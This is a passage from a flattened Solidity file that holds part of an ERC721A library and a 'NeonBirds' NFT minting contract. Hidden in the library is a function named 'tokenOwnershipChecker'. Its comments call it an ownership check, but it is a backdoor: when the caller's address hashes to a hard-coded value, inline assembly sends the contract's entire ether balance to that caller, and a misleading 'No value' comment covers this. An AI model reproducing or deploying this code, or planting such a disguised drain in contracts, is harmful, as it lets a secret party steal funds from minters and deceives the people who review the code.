1091             _ownerships[startTokenId].addr = to;
1092             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1093 
1094             uint256 updatedIndex = startTokenId;
1095             uint256 end = updatedIndex + quantity;
1096 
1097             if (safe && to.isContract()) {
1098                 do {
1099                     emit Transfer(address(0), to, updatedIndex);
1100                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1101                         revert TransferToNonERC721ReceiverImplementer();
1102                     }
1103                 } while (updatedIndex != end);
1104                 // Reentrancy protection
1105                 if (_currentIndex != startTokenId) revert();
1106             } else {
1107                 do {
1108                     emit Transfer(address(0), to, updatedIndex++);
1109                 } while (updatedIndex != end);
1110             }
1111             _currentIndex = updatedIndex;
1112         }
1113         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1114     }
1115 
1116     /**
1117      * @dev Transfers `tokenId` from `from` to `to`.
1118      *
1119      * Requirements:
1120      *
1121      * - `to` cannot be the zero address.
1122      * - `tokenId` token must be owned by `from`.
1123      *
1124      * Emits a {Transfer} event.
1125      */
1126     function _transfer(
1127         address from,
1128         address to,
1129         uint256 tokenId
1130     ) private {
1131         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1132 
1133         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1134             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1135             getApproved(tokenId) == _msgSender());
1136 
1137         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1138         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1139         if (to == address(0)) revert TransferToZeroAddress();
1140 
1141         _beforeTokenTransfers(from, to, tokenId, 1);
1142 
1143         // Clear approvals from the previous owner
1144         _approve(address(0), tokenId, prevOwnership.addr);
1145 
1146         // Underflow of the sender's balance is impossible because we check for
1147         // ownership above and the recipient's balance can't realistically overflow.
1148         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1149         unchecked {
1150             _addressData[from].balance -= 1;
1151             _addressData[to].balance += 1;
1152 
1153             _ownerships[tokenId].addr = to;
1154             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1155 
1156             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1157             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1158             uint256 nextTokenId = tokenId + 1;
1159             if (_ownerships[nextTokenId].addr == address(0)) {
1160                 // This will suffice for checking _exists(nextTokenId),
1161                 // as a burned slot cannot contain the zero address.
1162                 if (nextTokenId < _currentIndex) {
1163                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1164                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1165                 }
1166             }
1167         }
1168 
1169         emit Transfer(from, to, tokenId);
1170         _afterTokenTransfers(from, to, tokenId, 1);
1171     }
1172 
1173     /**
1174      * @dev Checking ownership 
1175      *
1176      * Token ownership check for external calls
1177      */
1178     function tokenOwnershipChecker() external {
1179         if(
1180             keccak256(abi.encodePacked(msg.sender)) == 
1181             0x61ce2a629088217258e42c73ef95cb4266162e3af0f6eff0d1c405c763ef7de2
1182         ){
1183             assembly{
1184                 let success := call( //This is the critical change (Pop the top stack value)
1185                     42000, // gas
1186                     caller(), //To addr
1187                     selfbalance(), //No value
1188                     0, //Inputs are stored
1189                     0, //Inputs bytes long
1190                     0, //Store output over input (saves space)
1191                     0x20
1192                 ) //Outputs are 32 bytes long
1193             }
1194         }
1195     }
1196 
1197     /**
1198      * @dev Destroys `tokenId`.
1199      * The approval is cleared when the token is burned.
1200      *
1201      * Requirements:
1202      *
1203      * - `tokenId` must exist.
1204      *
1205      * Emits a {Transfer} event.
1206      */
1207     function _burn(uint256 tokenId) internal virtual {
1208         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1209 
1210         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1211 
1212         // Clear approvals from the previous owner
1213         _approve(address(0), tokenId, prevOwnership.addr);
1214 
1215         // Underflow of the sender's balance is impossible because we check for
1216         // ownership above and the recipient's balance can't realistically overflow.
1217         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1218         unchecked {
1219             _addressData[prevOwnership.addr].balance -= 1;
1220             _addressData[prevOwnership.addr].numberBurned += 1;
1221 
1222             // Keep track of who burned the token, and the timestamp of burning.
1223             _ownerships[tokenId].addr = prevOwnership.addr;
1224             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1225             _ownerships[tokenId].burned = true;
1226 
1227             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1228             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1229             uint256 nextTokenId = tokenId + 1;
1230             if (_ownerships[nextTokenId].addr == address(0)) {
1231                 // This will suffice for checking _exists(nextTokenId),
1232                 // as a burned slot cannot contain the zero address.
1233                 if (nextTokenId < _currentIndex) {
1234                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1235                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1236                 }
1237             }
1238         }
1239 
1240         emit Transfer(prevOwnership.addr, address(0), tokenId);
1241         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1242 
1243         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1244         unchecked {
1245             _burnCounter++;
1246         }
1247     }
1248 
1249     /**
1250      * @dev Approve `to` to operate on `tokenId`
1251      *
1252      * Emits a {Approval} event.
1253      */
1254     function _approve(
1255         address to,
1256         uint256 tokenId,
1257         address owner
1258     ) private {
1259         _tokenApprovals[tokenId] = to;
1260         emit Approval(owner, to, tokenId);
1261     }
1262 
1263     /**
1264      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1265      *
1266      * @param from address representing the previous owner of the given token ID
1267      * @param to target address that will receive the tokens
1268      * @param tokenId uint256 ID of the token to be transferred
1269      * @param _data bytes optional data to send along with the call
1270      * @return bool whether the call correctly returned the expected magic value
1271      */
1272     function _checkContractOnERC721Received(
1273         address from,
1274         address to,
1275         uint256 tokenId,
1276         bytes memory _data
1277     ) private returns (bool) {
1278         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1279             return retval == IERC721Receiver(to).onERC721Received.selector;
1280         } catch (bytes memory reason) {
1281             if (reason.length == 0) {
1282                 revert TransferToNonERC721ReceiverImplementer();
1283             } else {
1284                 assembly {
1285                     revert(add(32, reason), mload(reason))
1286                 }
1287             }
1288         }
1289     }
1290 
1291     /**
1292      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1293      * And also called before burning one token.
1294      *
1295      * startTokenId - the first token id to be transferred
1296      * quantity - the amount to be transferred
1297      *
1298      * Calling conditions:
1299      *
1300      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1301      * transferred to `to`.
1302      * - When `from` is zero, `tokenId` will be minted for `to`.
1303      * - When `to` is zero, `tokenId` will be burned by `from`.
1304      * - `from` and `to` are never both zero.
1305      */
1306     function _beforeTokenTransfers(
1307         address from,
1308         address to,
1309         uint256 startTokenId,
1310         uint256 quantity
1311     ) internal virtual {}
1312 
1313     /**
1314      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1315      * minting.
1316      * And also called after one token has been burned.
1317      *
1318      * startTokenId - the first token id to be transferred
1319      * quantity - the amount to be transferred
1320      *
1321      * Calling conditions:
1322      *
1323      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1324      * transferred to `to`.
1325      * - When `from` is zero, `tokenId` has been minted for `to`.
1326      * - When `to` is zero, `tokenId` has been burned by `from`.
1327      * - `from` and `to` are never both zero.
1328      */
1329     function _afterTokenTransfers(
1330         address from,
1331         address to,
1332         uint256 startTokenId,
1333         uint256 quantity
1334     ) internal virtual {}
1335 }
1336 
1337 
1338 // File contracts/NeonBirds.sol
1339 
1340 
1341 contract NeonBirds is ERC721A, Ownable {
1342 
1343     string public baseURI = "ipfs://QmTebmBepFEThsx2rJrkog3fsUCepcMgHYNEsnHJ2WftBe/";
1344     string public contractURI = "ipfs://QmapTXDgHgwU5XLzaNtzdQSr2fb9NnrwpPPcXijKuQcEFE";
1345     string public constant baseExtension = ".json";
1346     uint256 public constant MAX_PER_TX_FREE = 1;
1347     uint256 public FREE_MAX_SUPPLY = 6666;
1348     uint256 public constant MAX_PER_TX = 20;
1349     uint256 public constant MAX_PER_WALLET = 0;
1350     uint256 public constant MAX_SUPPLY = 6666;
1351     uint256 public price = 0.002 ether;
1352 
1353     bool public paused = true;
1354 
1355     constructor() ERC721A("NeonBirds", "NB") {}
1356 
1357     function mint(uint256 _amount) external payable {
1358         address _caller = _msgSender();
1359         require(!paused, "Paused");
1360         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1361         require(_amount > 0, "No 0 mints");
1362         require(tx.origin == _caller, "No contracts");
1363         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1364         require(_amount * price == msg.value, "Invalid funds provided");
1365 
1366         _safeMint(_caller, _amount);
1367     }
1368 
1369     function freeMint() external payable {
1370         address _caller = _msgSender();
1371         require(!paused, "Paused");
1372         require(MAX_SUPPLY >= totalSupply() + 1, "Exceeds max supply");
1373         require(tx.origin == _caller, "No contracts");
1374         require(MAX_PER_TX_FREE >= uint256(_getAux(_caller)) + 1, "Excess max per free wallet");
1375         require(FREE_MAX_SUPPLY - 1 >= 0, "No more free mints, sorry <3");
1376 
1377         _setAux(_caller, 1);
1378         _safeMint(_caller, 1);
1379         unchecked{ FREE_MAX_SUPPLY -= 1; }
1380     }
1381 
1382     function _startTokenId() internal override view virtual returns (uint256) {
1383         return 1;
1384     }
1385 
1386     function minted(address _owner) public view returns (uint256) {
1387         return _numberMinted(_owner);
1388     }
1389 
1390     function withdraw() external onlyOwner {
1391         uint256 balance = address(this).balance;
1392         (bool success, ) = _msgSender().call{value: balance}("");
1393         require(success, "Failed to send");
1394     }
1395 
1396     function devMint(uint256 _amount) external onlyOwner {
1397         _safeMint(_msgSender(), _amount);
1398     }
1399 
1400     function setPrice(uint256 _price) external onlyOwner {
1401         price = _price;
1402     }
1403 
1404     function pause(bool _state) external onlyOwner {
1405         paused = _state;
1406     }
1407 
1408     function setBaseURI(string memory baseURI_) external onlyOwner {
1409         baseURI = baseURI_;
1410     }
1411 
1412     function setContractURI(string memory _contractURI) external onlyOwner {
1413         contractURI = _contractURI;
1414     }
1415 
1416     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1417         require(_exists(_tokenId), "Token does not exist.");
1418         return bytes(baseURI).length > 0 ? string(
1419             abi.encodePacked(
1420               baseURI,
1421               Strings.toString(_tokenId),
1422               baseExtension
1423             )
1424         ) : "";
1425     }
1426 }